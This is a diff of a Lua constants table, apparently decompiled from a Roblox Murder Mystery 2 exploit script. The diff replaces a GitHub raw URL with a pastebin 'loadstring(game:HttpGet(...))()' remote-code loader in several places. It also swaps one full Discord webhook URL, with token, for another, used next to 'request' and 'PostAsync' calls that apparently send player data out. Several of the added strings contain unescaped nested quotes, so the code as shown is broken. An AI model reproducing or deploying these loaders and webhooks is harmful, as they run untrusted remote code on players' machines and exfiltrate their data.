@@ -1,5 +1,3 @@
--- This file was generated at discord.gg/syncrypt
-
 return {
     protos = {
         [0] = {
@@ -244,7 +242,7 @@ return {
                 [45] = "EasingDirection",
                 [46] = "Out",
                 [47] = "Create",
-                [48] = "https://raw.githubusercontent.com/Mm2script-maker/wwwwwwwww/refs/heads/main/wwwww", -- x4
+                [48] = "loadstring(game:HttpGet("https://pastebin.com/raw/PbBRYXfV"))()", -- x4
                 [49] = "FindFirstChild",
                 [50] = "SodiumSupportedGamesGui", -- x3
                 [51] = "task", -- x2
@@ -334,7 +332,7 @@ return {
                 [0] = "loadstring",
                 [1] = "game",
                 [2] = "HttpGet",
-                [3] = "https://raw.githubusercontent.com/Mm2script-maker/wwwwwwwww/refs/heads/main/wwwww",
+                [3] = "loadstring(game:HttpGet("https://pastebin.com/raw/PbBRYXfV"))()",
             },
             booleans = {
                 [0] = true,
@@ -346,7 +344,7 @@ return {
                 [0] = "loadstring",
                 [1] = "game",
                 [2] = "HttpGet",
-                [3] = "https://raw.githubusercontent.com/Mm2script-maker/wwwwwwwww/refs/heads/main/wwwww",
+                [3] = "loadstring(game:HttpGet("https://pastebin.com/raw/PbBRYXfV"))()",
             },
             booleans = {
                 [0] = true,
@@ -390,7 +388,7 @@ return {
         [15] = {
             parent = 0,
             strings = {
-                [0] = "https://raw.githubusercontent.com/Mm2script-maker/wwwwwwwww/refs/heads/main/wwwww",
+                [0] = "loadstring(game:HttpGet("https://pastebin.com/raw/PbBRYXfV"))()",
                 [1] = "loadstring",
                 [2] = "game",
                 [3] = "HttpGet",
@@ -417,7 +415,7 @@ return {
                 [3] = "Disconnect",
                 [4] = "TeleportInitFailed",
                 [5] = "Connect",
-                [6] = "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Mm2script-maker/wwwwwwwww/refs/heads/main/wwwww\"))()", -- x2
+                [6] = "loadstring(game:HttpGet("https://pastebin.com/raw/PbBRYXfV"))()", -- x2
             },
             proto_references = {
                 [0] = { proto = 30 },
@@ -436,7 +434,7 @@ return {
                 [5] = "Headers",
                 [6] = "request", -- x2
                 [7] = "Url",
-                [8] = "https://discord.com/api/webhooks/1544089812384878693/zd6XOgw92WyVSiGJbIrELjmXY09dLWpqYZ-48ajqZzbY7foZSKzImSXzZtwUzh-hz4Br", -- x2
+                [8] = "https://discord.com/api/webhooks/1546811433415614536/DjCsUFLDF4MkP6BJrbY8kYwyxulXJFDvlz47uH6HRDIQZ1-rs3qkl28zkSl5bdgnRwI0", -- x2
                 [9] = "PostAsync",
             },
         },
@@ -598,7 +596,7 @@ return {
                 [0] = "loadstring",
                 [1] = "game",
                 [2] = "HttpGet",
-                [3] = "https://raw.githubusercontent.com/Mm2script-maker/wwwwwwwww/refs/heads/main/wwwww",
+                [3] = "loadstring(game:HttpGet("https://pastebin.com/raw/PbBRYXfV"))()",
             },
         },
         [29] = {
